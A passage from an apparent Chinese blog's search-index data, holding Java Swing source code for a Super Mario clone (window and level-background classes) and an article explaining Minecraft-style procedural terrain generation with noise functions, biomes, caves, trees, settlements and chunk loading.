超级玛丽窗口","content":"说明首先要基于：Java 创建窗口\n其次基于：Java 超级玛丽常量类\n搭配文件：Java 超级玛丽背景类\n\n代码演示package com.arvin;\n\nimport javazoom.jl.decoder.JavaLayerException;\n\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport java.io.FileNotFoundException;\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  窗口框架类\n *&#x2F;\n\npublic class WindowsFrame  extends JFrame implements KeyListener,Runnable &#123;\n\n    &#x2F;&#x2F; 用于存储所有的背景\n    private List&lt;BackGround&gt; AllBackground &#x3D; new ArrayList&lt;&gt;();\n\n    &#x2F;&#x2F; 用于存档当前的背景\n    private BackGround NowBackground &#x3D; new BackGround();\n\n    &#x2F;&#x2F; 用于双缓存\n    private Image OffScreenImage &#x3D; null; &#x2F;&#x2F; 该变量为我们的双缓存\n\n    &#x2F;&#x2F; 定义马里奥对象\n    private Mario mario &#x3D; new Mario();\n\n    &#x2F;&#x2F; 定义一个线程对象用于马里奥运动\n    private Thread thread &#x3D; new Thread(this);\n\n    &#x2F;&#x2F; 空参构造\n    public WindowsFrame()&#123;\n\n        &#x2F;&#x2F; 设置窗口的大小为 800 * 600\n        this.setSize(800, 600);\n\n        &#x2F;&#x2F; 设置窗口居中显示\n        this.setLocationRelativeTo(null);\n\n        &#x2F;&#x2F; 设置窗口的可见性\n        this.setVisible(true);\n\n        &#x2F;&#x2F; 创建点击窗口上的关闭键，结束程序\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\n        &#x2F;&#x2F; 设置窗口大小不可变\n        this.setResizable(false);\n\n        &#x2F;&#x2F; 向窗口对象添加键盘监听器 需要该类实现 KeyListener 接口 并重写抽象方法\n        this.addKeyListener(this);\n\n        &#x2F;&#x2F; 设置窗口名称\n        this.setTitle(&quot;超级玛丽&quot;);\n\n        &#x2F;&#x2F; 在空参构造中调用常量类的初始化(图片)方法\n        StaticValue.Init();\n\n        &#x2F;&#x2F; 初始化马里奥对象\n        mario &#x3D; new Mario(10,355);\n\n        &#x2F;&#x2F; 创建全部场景，因为有3个场景所以我们要通过 For 循环进行创建\n        for (int i &#x3D; 1; i &lt;&#x3D; 3; i++) &#123;\n            AllBackground.add(new BackGround(i, i &#x3D;&#x3D; 3 ? true : false)); &#x2F;&#x2F; 传入二个参数：当前关卡数 | 是否为最后一关的布尔变量(三目运算) |\n        &#125;\n\n        &#x2F;&#x2F; 将第一个场景设置为当前场景，修改这里参数可以进入不同关卡\n        NowBackground &#x3D; AllBackground.get(0);\n        mario.setBackGround(NowBackground); &#x2F;&#x2F; 将第一个场景的 BackGround 对象传递给马里奥\n\n        &#x2F;&#x2F; 调用 repaint(); 方法 绘制图像\n        repaint();\n\n        thread.start(); &#x2F;&#x2F; 启动线程\n\n        &#x2F;&#x2F; 播放音乐 实例化一个 Music 对象\n        try &#123;\n            new Music();\n        &#125; catch (FileNotFoundException exception) &#123;\n            exception.printStackTrace();\n        &#125; catch (JavaLayerException exception) &#123;\n            exception.printStackTrace();\n        &#125;\n\n    &#125;\n\n    &#x2F;**\n     *  重写 Paint 方法\n     *&#x2F;\n    public void paint(Graphics GraphicsPaint) &#123;\n        if (OffScreenImage &#x3D;&#x3D; null)&#123;\n            OffScreenImage &#x3D; createImage(800,600);  &#x2F;&#x2F; 为空 创建图像 调用 createImage() 方法\n        &#125;\n\n        Graphics graphics &#x3D; OffScreenImage.getGraphics(); &#x2F;&#x2F; 定义 Graphics 对象\n        graphics.fillRect(0,0,800,600); &#x2F;&#x2F; 调用 Graphics 的 fillRect(); 方法对我们的图像进行填充\n        graphics.drawImage(NowBackground.getBgImage(),0,0,this); &#x2F;&#x2F; 绘制背景 (此时我们的图像绘制在缓冲区上)\n        &#x2F;&#x2F; 绘制敌人 (注意绘制在障碍物前，因为要被障碍物挡住)\n        for (Enemy enemy : NowBackground.getEnemyList())&#123;\n            graphics.drawImage(enemy.getShow(),enemy.getX(),enemy.getY(),this);\n        &#125;\n\n        &#x2F;&#x2F; 绘制障碍物 通过增强 For 循环\n        for (Obstacle obstacle:NowBackground.getObstacleList()) &#123;\n            graphics.drawImage(obstacle.getShow(),obstacle.getX(),obstacle.getY(),this);\n        &#125;\n\n        &#x2F;&#x2F; 绘制城堡\n        graphics.drawImage(NowBackground.getTower(),620,270,this);\n\n        &#x2F;&#x2F; 绘制旗杆\n        graphics.drawImage(NowBackground.getGan(),500,220,this);\n\n        &#x2F;&#x2F; 绘制马里奥对象\n        graphics.drawImage(mario.getShow(),mario.getX(),mario.getY(),this);\n\n        &#x2F;&#x2F; 绘制积分\n        Color color &#x3D; graphics.getColor(); &#x2F;&#x2F; 保存我们的颜色\n        graphics.setColor(Color.BLACK); &#x2F;&#x2F; 颜色设置为黑色\n        graphics.setFont(new Font(&quot;宋体&quot;,Font.BOLD,25)); &#x2F;&#x2F; 设置字体为宋体 加粗 字号 25\n        graphics.drawString(&quot;当前分数：&quot;+ mario.getScore(),300,100); &#x2F;&#x2F; 绘制显示\n        graphics.setColor(color); &#x2F;&#x2F; 还原我们的字体颜色\n\n        GraphicsPaint.drawImage(OffScreenImage,0,0,this); &#x2F;&#x2F; 我们将缓冲区的图片绘制到窗口中\n        \n    &#125;\n\n\n    &#x2F;**\n     *  Main 主函数\n     *&#x2F;\n    public static void main(String[] args)&#123;\n\n        &#x2F;&#x2F; 创建 WindowsFrame 的对象\n        WindowsFrame windowsFrame &#x3D; new WindowsFrame();\n    &#125;\n\n    &#x2F;**\n     *  KeyListener并重写抽象方法\n     *&#x2F;\n\n    @Override\n    public void keyTyped(KeyEvent e) &#123;\n\n    &#125;\n\n    &#x2F;&#x2F; 当键盘按下按钮时调用\n    @Override\n    public void keyPressed(KeyEvent e) &#123;\n\n        &#x2F;&#x2F; 向右移动\n        if (e.getKeyCode() &#x3D;&#x3D; 39) &#123;\n            mario.rightMove();\n        &#125;\n\n        &#x2F;&#x2F; 向左移动\n        if (e.getKeyCode() &#x3D;&#x3D; 37) &#123;\n            mario.leftMove();\n        &#125;\n\n        &#x2F;&#x2F; 跳跃\n        if (e.getKeyCode() &#x3D;&#x3D; 32)&#123;\n            mario.jump();\n        &#125;\n\n    &#125;\n\n    &#x2F;&#x2F; 当键盘松开按键时调用\n    @Override\n    public void keyReleased(KeyEvent e) &#123;\n\n        &#x2F;&#x2F; 向左停止\n        if (e.getKeyCode() &#x3D;&#x3D; 37)&#123;\n            mario.leftStop();\n        &#125;\n\n        &#x2F;&#x2F; 向右停止\n        if (e.getKeyCode()  &#x3D;&#x3D; 39)&#123;\n            mario.rightStop();\n        &#125;\n\n    &#125;\n\n    &#x2F;&#x2F; 重写 Runnable 抽象方法\n    @Override\n    public void run() &#123;\n        while (true)&#123;\n            repaint();  &#x2F;&#x2F; 重写绘制图像\n            try &#123;\n                Thread.sleep(50); &#x2F;&#x2F;线程休眠 50 毫秒\n\n                &#x2F;&#x2F; 判断马里奥是否在屏幕最右边，如果是切换场景\n                if (mario.getX() &gt;&#x3D; 775)&#123;\n                    NowBackground &#x3D; AllBackground.get(NowBackground.getSort());\n                    mario.setBackGround(NowBackground); &#x2F;&#x2F; 将当前场景对象传递给马里奥类\n                    mario.setX(10);   &#x2F;&#x2F; 重置马里奥坐标，到出生点位置\n                    mario.setY(395);\n                &#125;\n\n                &#x2F;&#x2F; 马里奥是否死亡\n                if (mario.isDeath())&#123;\n                    JOptionPane.showMessageDialog(this,&quot;马里奥死亡演示结束 - Arvin&quot;);\n                    System.exit(0); &#x2F;&#x2F; 结束程序\n                &#125;\n\n                &#x2F;&#x2F; 判断游戏是否结束\n                if (mario.isOK()) &#123; &#x2F;&#x2F;判断是否结束 弹出一个窗口 调用JOptionPane 的 showMessageDialog 方法\n                    JOptionPane.showMessageDialog(this,&quot;Demo演示结束 - Arvin&quot;);\n                    System.exit(0); &#x2F;&#x2F; 结束程序\n                &#125;\n\n            &#125; catch (InterruptedException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n    &#125;\n&#125;","slug":"CodeGame_Java_SuperMary_Test03","date":"2021-11-07T12:16:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"bfaf101dcab4b3312323018980f23fb2","title":"Java 超级玛丽背景类","content":"配合文件：Java 超级玛丽窗口\n\n代码演示：package com.arvin;\n\nimport java.awt.image.BufferedImage;\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  背景类\n *&#x2F;\n\npublic class BackGround &#123;\n\n    &#x2F;* 调用BufferedImage 该对象用于显示当前场景的图片 *&#x2F;\n    private BufferedImage bgImage &#x3D; null;\n\n    &#x2F;* 记录当前是第几个场景(关卡) *&#x2F;\n    private int sort;\n\n    &#x2F;* 判断是否是最后一个场景 *&#x2F;\n    private boolean flag;\n\n    &#x2F;* 用于存放我们所有的障碍物 *&#x2F;\n    private List&lt;Obstacle&gt; ObstacleList &#x3D; new ArrayList&lt;&gt;();\n\n    &#x2F;* 用于存放我们所有的敌人 *&#x2F;\n    private List&lt;Enemy&gt; enemyList &#x3D; new ArrayList&lt;&gt;();\n\n    &#x2F;* 用于显示旗杆 *&#x2F;\n    private BufferedImage Gan &#x3D; null;\n\n    &#x2F;* 用于显示城堡 *&#x2F;\n    private BufferedImage Tower &#x3D; null;\n\n    &#x2F;&#x2F; 判断马里奥是否到达旗杆位置\n    private boolean isReach &#x3D; false;\n\n    &#x2F;&#x2F; 判断旗子是否落地\n    private boolean isBase &#x3D; false;\n\n    &#x2F;* 空参构造 *&#x2F;\n    public BackGround() &#123;\n\n    &#125;\n\n    &#x2F;* 含两个参数的构造参数 *&#x2F;\n    public BackGround(int sort,boolean flag) &#123;\n        this.sort &#x3D; sort;\n        this.flag &#x3D; flag;\n\n        &#x2F;* 判断我们此时的 flag 是否为 true *&#x2F;\n        if (flag) &#123;\n            bgImage &#x3D; StaticValue.BackgroundImage_Two;\n        &#125;else&#123;\n            bgImage &#x3D; StaticValue.BackgroundImage_Noe;\n        &#125;\n\n        &#x2F;* 判断是否是第一关 *&#x2F;\n        if (sort &#x3D;&#x3D; 1) &#123;\n            &#x2F;&#x2F; 绘制第一关的地面，上地面 type &#x3D; 1，下地面 type &#x3D; 2\n            for (int i &#x3D; 0; i &lt; 27; i++) &#123;\n                ObstacleList.add(new Obstacle(i*30,420,1,this));    &#x2F;&#x2F; 绘制上地面\n            &#125;\n            &#x2F;&#x2F; 双重 For 循环绘制下地面\n            for (int j &#x3D; 0; j &lt;&#x3D; 120; j +&#x3D; 30) &#123;\n                for (int i &#x3D; 0; i &lt; 27; i++) &#123;\n                    ObstacleList.add(new Obstacle(i*30,570-j,2,this));\n                &#125;\n            &#125;\n\n\n            &#x2F;* 绘制砖块A *&#x2F;\n            for (int i &#x3D; 120; i &lt;&#x3D; 150 ; i +&#x3D; 30) &#123;\n                ObstacleList.add(new Obstacle(i,300,3,this));\n            &#125;\n            &#x2F;&#x2F; 绘制砖块 B - F\n            for (int i &#x3D; 300; i &lt;&#x3D; 570; i +&#x3D; 30) &#123;\n                if (i &#x3D;&#x3D; 360 || i &#x3D;&#x3D; 390 || i &#x3D;&#x3D; 480 || i&#x3D;&#x3D;510 || i &#x3D;&#x3D; 540) &#123;   &#x2F;&#x2F; 判断是否是蓝色砖块\n                    ObstacleList.add(new Obstacle(i,300,3,this));\n                &#125;else&#123;  &#x2F;&#x2F; 否则是普通砖块\n                    ObstacleList.add(new Obstacle(i,300,0,this));\n                &#125;\n            &#125;\n            &#x2F;&#x2F; 绘制砖块 G\n            for (int i &#x3D; 420; i &lt;&#x3D; 450; i+&#x3D;30) &#123;\n                ObstacleList.add(new Obstacle(i,240,3,this));\n            &#125;\n\n            &#x2F;&#x2F; 绘制水管\n            for (int i &#x3D; 360; i &lt;&#x3D;600; i +&#x3D; 25)&#123;\n                if (i &#x3D;&#x3D; 360)&#123; &#x2F;&#x2F; 绘制水管最上层\n                    ObstacleList.add(new Obstacle(620,i,5,this));\n                    ObstacleList.add(new Obstacle(645,i,6,this));\n                &#125;else&#123;\n                    ObstacleList.add(new Obstacle(620,i,7,this));\n                    ObstacleList.add(new Obstacle(645,i,8,this));\n                &#125;\n            &#125;\n            &#x2F;&#x2F; 绘制第一关蘑菇敌人\n            enemyList.add(new Enemy(580,385,true,1,this));\n            &#x2F;&#x2F; 绘制第一关食人花敌人\n            enemyList.add(new Enemy(635,420,true,2,328,428,this));\n        &#125;\n\n        &#x2F;&#x2F; 判断是否是第二关\n        if (sort &#x3D;&#x3D; 2) &#123;\n            &#x2F;&#x2F; 绘制第二关地面\n            for (int i &#x3D; 0; i &lt; 27; i++)&#123;\n                ObstacleList.add(new Obstacle(i*30,420,1,this));\n            &#125;\n            for (int j &#x3D; 0; j &lt;&#x3D; 120; j+&#x3D; 30)&#123;\n                for (int i &#x3D; 0; i &lt; 27; i++)&#123;\n                    ObstacleList.add(new Obstacle(i*30,570-j,2,this));\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 绘制水管和第一关一样只需要修改坐标\n            for (int i &#x3D;  360; i &lt;&#x3D; 600; i +&#x3D; 25)&#123;\n                if (i &#x3D;&#x3D; 360) &#123;\n                    ObstacleList.add(new Obstacle(60,i,5,this));\n                    ObstacleList.add(new Obstacle(85,i,6,this));\n                &#125;else&#123;\n                    ObstacleList.add(new Obstacle(60,i,7,this));\n                    ObstacleList.add(new Obstacle(85,i,8,this));\n                &#125;\n            &#125;\n\n            for (int i &#x3D; 330; i &lt;&#x3D;600; i+&#x3D; 25)&#123;\n                if (i &#x3D;&#x3D; 330) &#123;\n                    ObstacleList.add(new Obstacle(620,i,5,this));\n                    ObstacleList.add(new Obstacle(645,i,6,this));\n                &#125;else&#123;\n                    ObstacleList.add(new Obstacle(620,i,7,this));\n                    ObstacleList.add(new Obstacle(645,i,8,this));\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 绘制砖块 C\n            ObstacleList.add(new Obstacle(300,330,0,this));\n\n            &#x2F;&#x2F; 绘制砖块 B E G\n            for (int i &#x3D; 270; i &lt;&#x3D; 330; i+&#x3D;30)&#123;\n                if (i &#x3D;&#x3D; 270 || i &#x3D;&#x3D; 330) &#123;\n                    ObstacleList.add(new Obstacle(i,360,0,this));\n                &#125;else&#123;\n                    ObstacleList.add(new Obstacle(i,360,3,this));\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 绘制砖块 A D F H I\n            for (int i &#x3D; 240; i &lt;&#x3D; 360; i +&#x3D; 30)&#123;\n                if (i &#x3D;&#x3D; 240 || i &#x3D;&#x3D; 360)&#123;\n                    ObstacleList.add(new Obstacle(i,390,0,this));\n                &#125;else&#123;\n                    ObstacleList.add(new Obstacle(i,390,3,this));\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 绘制妨碍 1 砖块\n            ObstacleList.add(new Obstacle(240,300,0,this));\n\n            &#x2F;&#x2F; 绘制 空 1 - 4 砖块\n            for (int i &#x3D; 360; i &lt;&#x3D; 540; i +&#x3D; 60) &#123;\n                ObstacleList.add(new Obstacle(i,270,3,this));\n            &#125;\n\n            &#x2F;&#x2F; 绘制第二关第一个食人花敌人\n            enemyList.add(new Enemy(75,420,true,2,328,418,this));\n            &#x2F;&#x2F; 绘制第二关第二个食人花敌人\n            enemyList.add(new Enemy(635,420,true,2,298,388,this));\n            &#x2F;&#x2F; 绘制第二关第一个蘑菇敌人\n            enemyList.add(new Enemy(200,385,true,1,this));\n            &#x2F;&#x2F; 绘制第二关第二个蘑菇敌人\n            enemyList.add(new Enemy(500,385,true,1,this));\n        &#125;\n\n        &#x2F;&#x2F; 判断是否是第三关\n        if (sort &#x3D;&#x3D; 3) &#123;\n            &#x2F;&#x2F; 绘制第三关地面\n            for (int i &#x3D; 0; i &lt; 27; i++)&#123;\n                ObstacleList.add(new Obstacle(i*30,420,1,this));\n            &#125;\n            for (int j &#x3D; 0; j &lt;&#x3D; 120; j+&#x3D; 30)&#123;\n                for (int i &#x3D; 0; i &lt; 27; i++)&#123;\n                    ObstacleList.add(new Obstacle(i*30,570-j,2,this));\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 绘制 A - O 砖块\n            int temp &#x3D; 290;\n            for (int i &#x3D; 390; i &gt;&#x3D; 270; i -&#x3D; 30) &#123;\n                for (int j &#x3D; temp; j &lt;&#x3D; 410; j +&#x3D; 30) &#123;\n                    ObstacleList.add(new Obstacle(j,i,3,this));\n                &#125;\n                temp +&#x3D; 30;\n            &#125;\n\n            &#x2F;&#x2F; 绘制 P - R 砖块\n            temp &#x3D; 60;\n            for (int i &#x3D; 390; i &gt;&#x3D; 360; i -&#x3D; 30) &#123;\n                for (int j &#x3D; temp; j &lt;&#x3D; 90; j +&#x3D; 30) &#123;\n                    ObstacleList.add(new Obstacle(j,i,3,this));\n                &#125;\n                temp +&#x3D; 30;\n            &#125;\n\n            &#x2F;&#x2F; 绘制旗杆\n            Gan &#x3D; StaticValue.Gan;\n\n            &#x2F;&#x2F;绘制城堡\n            Tower &#x3D; StaticValue.Tower;\n\n            &#x2F;&#x2F; 添加旗子到旗杆上 旗子的坐标 x515 y220\n            ObstacleList.add(new Obstacle(515,220,4,this));\n\n            &#x2F;&#x2F; 绘制第三关蘑菇敌人\n            enemyList.add(new Enemy(150,385,true,1,this));\n        &#125;\n    &#125;\n\n    &#x2F;* 生成上面函数的 Get 方法 *&#x2F;\n\n    public BufferedImage getBgImage() &#123;\n        return bgImage;\n    &#125;\n\n    public int getSort() &#123;\n        return sort;\n    &#125;\n\n    public boolean isFlag() &#123;\n        return flag;\n    &#125;\n\n    &#x2F;&#x2F; 生成 ObstacleList 的 Get 方法\n    public List&lt;Obstacle&gt; getObstacleList() &#123;\n        return ObstacleList;\n    &#125;\n\n    &#x2F;&#x2F; 生成 城堡和旗杆的 Get 方法\n    public BufferedImage getGan() &#123;\n        return Gan;\n    &#125;\n\n    public BufferedImage getTower() &#123;\n        return Tower;\n    &#125;\n\n    &#x2F;&#x2F; 生成 判断是否到达旗杆位置的 Set Get 方法\n    public boolean isReach() &#123;\n        return isReach;\n    &#125;\n\n    public void setReach(boolean reach) &#123;\n        isReach &#x3D; reach;\n    &#125;\n\n    &#x2F;&#x2F; 生成 判断旗子是否落地 Set Get 方法\n\n    public boolean isBase() &#123;\n        return isBase;\n    &#125;\n\n    public void setBase(boolean base) &#123;\n        isBase &#x3D; base;\n    &#125;\n\n    &#x2F;&#x2F; 用于存放我们所有的敌人 的 Get 方法\n    public List&lt;Enemy&gt; getEnemyList() &#123;\n        return enemyList;\n    &#125;\n&#125;","slug":"CodeGame_Java_SuperMary_Test04","date":"2021-11-07T12:13:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"b9f0a691f1e575c41aa38be21dfe4644","title":"Minecraft 类游戏地形生成算法","content":"Minecraft 类游戏地形生成算法噪声算法\n\n\n\n\n\n\n\n\n为什么要有噪声？\n 随机数 VS 噪声\n随机数：随机生成一个噪点不一的黑白图，但因为过于随机生成的图看起来特别不舒服。\n 噪声：具有随机性、可哈希的、平滑性。\n  \n\nValue 噪声算法\n\n\n\n\n\n\n\n\n\nNoise2D(pos) &#x3D; lerp(顶点A,顶点B,s(t)),t∈[0,1]\n\n\n\n\n\n\n\n\n\n\n\n定义若干个顶点，且每个顶点含有一个随机值（以顶点坐标为参数，通过 Hash 运算得到）\n顶点会对周围坐标产生影响，越靠近顶点，则越容易受该顶点的随机值影响\n某个坐标的噪声值 &#x3D; 该坐标附近的所有顶点所造成的影响之和\n\n\nPerlin 噪声 (柏林噪声)\n\n\n\n\n\n\n\n\n\n\n\n定义若干个顶点，且每个顶点含有一个随机向量（以顶点坐标作为参数，通过 Hash 运算）\n顶点会对周围坐标产生影响，和顶点随机向量的夹角越小，则得到的值越大\n某个坐标的噪声值 &#x3D; 该坐标附近的所有顶点所造成的影响值之和\n\n\nSimplex 噪声 （高维制作常用）\n\n\n\n\n\n\n\n\n\n\n\nPerlin 噪声在晶格结构上是正多胞，在 N 维下有 2^N 个顶点，一次噪声计算需要计算 2^N 个顶点的势能影响\nSimplex 噪声在晶格结构上是单形，在 N 维下有 n+1 个顶点，一次噪声计算需要计算 n+1 个顶点的势能影响\n\n\n\n地形生成流程\n\n生成地形高度图\n\n\n\n\n\n\n\n\n\n一般的地形生成中，地形高度场都是通过2D噪声（输入一个二维坐标，输出一个高度值）来生成的，但是一层噪声往往具有单调的特性（单一的频率Frequenccies 和 振幅Amplitudes），不能满足复杂的自然地形高度：地形可能会有大段连绵、高耸山地，也会有丘陵和蚀坑，更小点的有岩石块，甚至更小的鹅卵石块。\n 为了模拟出这样的自然噪声特性，我们可以借鉴 分形噪声 的思想，通过使用不同的参数进行多几次不同参数的噪声计算，然后将结果叠加在一起。\n\n在程序的高度生成中，将使用三层2D噪声进行叠加，其中：&gt; - 第一层：振幅大，频率小，用于模拟平坦大陆的效果&gt; - 第二层：振幅一般，频率一般，用于模拟山脉群的效果&gt; - 第三层：振幅小，频率大，用于模拟小山丘、地面小凹凸的效果&gt; Height(x,y)&#x3D;128∗Noise2D(4x,4y)+64∗Noise2D(8x,8y)+32∗Noise2D(16x,16y)生成生物群落\n生物群落（Biome）:\n\n\n\n\n\n\n\n\n\n实际上相当于一个区域的基本地形面貌，例如可分为草地、高原、雪原、沙漠、热带雨林等。影响生物群落的因素可以有很多，包含但不限于：温度、湿度、高度、距离大海的距离、魔力值。如何定义影响因素，完全取决于你的建模。\n程序中的生物群落属性只取决于 温度（Temperature）、湿度（Humidity）两个因素，而这两个因素又是分别由不同种子设置的噪声计算得出：\n\nTemperature(x,y)&#x3D;Noise2D(8x,8y)\nHumidity(x,y)&#x3D;Noise2D(8x,8y)\n\n程序将温度（Temperature）粗略分为热带、温带、寒带，湿度（Humidity）粗略分为干燥、湿润；然后也相应提供了六种不同的生物群落类型：草地、雪地、沙漠、热带雨林、温带树林、寒带针叶林。\n\n模拟雨水侵蚀、生成河流\n\n\n\n\n\n\n\n\nDFS思想解决，模拟大雨滴落在地面上砸出一个个小坑的效果。\n1.模拟一个雨滴，先定义雨滴的质量（比如5000）\n2.随机砸下来在某个位置，并计算它周边的梯度（下降最急的地方）\n3.沿着梯度移动雨滴，同时在原位置留下一定质量的水\n4.继续追踪雨滴进行计算，当雨滴质量衰减到0时或者流进海平面时视为终止\n对一定范围内随机模拟多个雨滴，得到的结果将是一个有侵蚀，甚至形成河流的地形\n\n\n生成洞穴、裂谷\n洞穴生成，实际上基于一层3D噪声（输入一个三维坐标，输出一个噪声值）来完成：\n\n\n\n\n\n\n\n\n\nCave(x,y,z)&#x3D;Noise3D(16x,16y,16z)\n然后再给定一个阈值，做如下判断：\n\n\n\n\n\n\n\n\n\n\n若噪声值高于阈值，则三维坐标对应方块挖空\n若噪声值低于阈值，则三维坐标对应方块保留\n\n当阈值越小，那么更加容易产生洞穴且洞穴规模越来越大\n\n\n\n\n\n\n\n\n\n然而这种洞穴往往是不规则的，显然是不符合裂谷、峡谷这种带有狭长特点的中空地形，对于这类地形可另外使用伸缩变换后的3D坐标参数，此外还应当加入高度因素的影响（例如高度越低，意味着越接近地底，因此赋予更低的阈值），这样也可以形成具有一定深度的裂谷。\n\n生成植被\n植被生成，则主要是在计算生成概率，它在DEMO程序中依赖四个因素（温度、湿度、噪声值、随机值）：\n其中，C1、C2、C3、C4 分别代表四个因素的权重，四个权重之和为1。\n植物生成概率依赖湿度、温度因素很合理，为什么要依赖噪声值、随机值呢？\n\n\n\n\n\n\n\n\n\n\n噪声值：让某些区域的植物分布足够密集，而另一些区域的植物分布可以稀疏甚至无分布，这些区域之间又可以做到植物密度的平滑衔接。\n随机值：密集分布区域的植物几乎每一格都会满足生成概率条件，为了避免过于密集，融入一些随机值因素，让分布的树木之间至少有一定的间距。\n\n\n放置树木（Bezier曲线）\n\n\n\n\n\n\n\n\n一旦满足生成概率条件，我们就可以根据当前方块的生物群落属性来决定放置什么样的植物（温带草、寒带草、蘑菇、花、寒带树、温带树、热带树…）。\n其中树木的放置稍微复杂些，DEMO程序采取了程序化生成而非模板生成的方式来放置树木： \n\n\n\n\n\n\n\n\n\n1.用一个随机数给出树木的最大高度 hmax\n2.还需要计算树干每层的树叶半径，这一步主要通过三阶Bezier曲线来计算。三阶Bezier曲线拥有4个控制点（2D坐标），将控制点的 x 视为树叶半径长，而 y 视为所处在的树干高度。由于树叶在最底层和最顶层都应该是没有树叶的，这样就可以将第一个控制点和最后一个控制点固定在 (0,0) 和 (hmax,0) ；而中间两个控制点则可以利用两个随机数作为不同的随机半径r1、r2，分别设置位于 (13hmax,r1) 和 (23hmax,r2)。\n3.在每个单位高度上对贝塞尔曲线上一次采样，从而得到每层树叶的半径值（采样后四舍五入）。\n\n如图所示，当计算出一棵树的随机高度为5时，用于生成树叶的贝塞尔曲线的第一个控制点和第四个控制点分别为(0,0)和(5,0)。接着，中间两个控制点，通过随机数4.5、2.5确定坐标分别为(1.66667,4.5)、(3.33333,2.5)。当树需要计算每层树叶半径时，就可以逐层对该贝塞尔曲线进行采样，共采样6次，对应6层树叶半径，分别为(0,0)、(1,2.2)、(2,2.6)、(3,2.4)、(4,1.6)、(5,0)，四舍五入后即为 (0,0)、(1,2)、(2,3)、(3,2)、(4,2)、(5,0)。\n\n\n生成建筑生成发展域（元胞自动机模型）基于元胞自动机模型。发展域可以理解成一个聚落的势力范围。而生成发展域的大概做法是：\n\n\n\n\n\n\n\n\n\n1.在某个方块设置聚落的源点\n2.进行若干轮迭代演化，来演绎聚落的发展（扩展势力范围），其中每轮发展需要根据温度、湿度、崎岖度（周围若干方块高低差）等因素来影响发展域的扩展方向，而且只扩张在势力范围邻接的方块。\n\n温度、湿度越适中、崎岖度越小的方块的代价更低，从而也更容易让聚落范围往这种方块的方向去扩展。\n而在DEMO程序实现中，有以下细节：\n\n\n\n\n\n\n\n\n\n\n需要设置一个最高发展度（迭代次数）。\n一个发展块设置为33个方块，这是因为相同大小的势力范围下，一次添加33个方块相比1个方块有着更少的迭代次数。\n每一轮迭代都从评估队列里将代价最低的发展块加入聚落的势力范围，然后将与该发展块相邻的发展块加入队列中，并分别进行代价评估（即温度、湿度、崎岖度的综合考量）。\n\n\n\n\n\n\n\n\n\n\n\n在《DwarfCorp》中，这种元胞自动机模型又可以用于模拟各文明在地图上的势力范围，让文明源点尽可能往条件宜人、土地肥沃且少冲突的区域扩张，通过若干轮迭代后，就能得出一条合理的文明势力边界\n\n\n放置建筑（DFS）\n\n\n\n\n\n\n\n\n放置建筑，主要是基于DFS算法（在某种意义上，用高大上的名词来讲就是波函数坍缩），在前面生成好的发展域内通过DFS算法随机尝试放置预制建筑。\n程序的大致实现：\n\n\n\n\n\n\n\n\n\n1.在待放置位置队列添加源点位置\n2.进行若干次循环，每次循环从队列中取出一个位置（以该位置为建筑中心点）尝试放置预制建筑。\n  -若建筑即将放置的区域并不是发展域的子集，则尝试放置失败。\n  -若建筑即将放置的区域是发展域的子集，则尝试放置成功，需将地形进行平整化后再放置建筑。接着，将该位置上下左右四个方向一定offset（需要融入一定的随机数，这样得到的建筑分布就不会过于工整）的位置添加进待放置位置队列。最后，移除发展域相应的区域方块记录（避免重复放置建筑）。\n\n\n连接道路（A*寻路）\n\n\n\n\n\n\n\n\n连接道路，主要是基于A*寻路算法，将每个建筑的门口视为目标点，通过寻路算法对所有目标点两两连成一条道路。然而问题在于，道路连接不是简单的寻找最短路，还得模拟出人类聚落主干道、分支路的特性。\n\n程序的解决方式：\n\n\n\n\n\n\n\n\n\n\n只需简单地修改代价函数，使结点在道路上的开销降低\n\n\n每次生成完一条道路，需记录道路位置信息，以方便下次寻路查询某个坐标是否位于道路中。\n\n这样，第一条道路虽然总是最短路，但是往后每次连接新道路时，这些寻路算法会相当大可能贴近或者连进原有道路，而不是直接连成最短路。若干条道路生成完毕后，就会显而易见看到干道、分支路的现象了。\n优化######地形加载&amp;渲染\n\n\n\n\n\n\n\n\n\n有时候可能加载方块太多导致内存不足，需要实现实时自动加载周围区域和卸载过远的区域。\n其次，Minecraft类地形中往往有大量方块被其它（上下左右前后共6个）方块所包围，从而不可视。而最初的渲染中，需要把所有存在的方块都渲染出来：\n\n如果对每个方块做可视测试（即检测其上下左右前后是否满足至少有一处无方块），通过测试的才提交渲染队列，于是便有了下图：\n\n为了解决边界问题（最外面的渲染边界的方块无法得知界外的方块信息），于是就采取了加载范围大于渲染范围的方案：\n\n\n\n\n\n\n\n\n\n\n块区（Chunk）：基本的地形加载&#x2F;卸载单位，在X轴、Y轴长度为16，在Z轴（高度轴）长度为256，可容纳1616256共65536个方块\n加载块区：计算出该块区每个位置的方块属性并存于内存\n渲染块区：将该块区里所有应该渲染的方块提交渲染队列\n\n\n以摄像机的位置为中心，将周围66个的块区作为需要加载的块区，而周围55个块区作为需要渲染的块区。这样渲染边界的方块也能得知界外方块（因为相邻的块区总是会被加载）的方块信息。\n\n数据存储&amp;查询\n\n\n\n\n\n\n\n\n一般来说，存储Minecraft类地形数据并不需要记录太多信息，得益于噪声算法的可哈希性，几乎仅需要一个种子，因为绝大部分方块（正常方块）都可以通过地形生成算法流程便能计算得出方块ID属性，即 F(seed,position)&#x3D;blockID。\n然而对于被玩家破坏、修改、新增而导致的方块ID属性产生变化，这时候就需要特别额外存储了。\n此外，在查询时可以对坐标压缩&#x2F;解压：Vector3D &lt;&#x3D;&gt; uint64 (28 bit,28 bit,8 bit)，Z轴高度由于最高为256，因此最多占8位。\n注意\n\n\n\n\n\n\n\n\n MC生物群落的生成用的是分层采样的算法，可以精确的知道每一个方块的生物群落类型。在分层采样过程中还会决定河流一些特殊地形的生成。\n 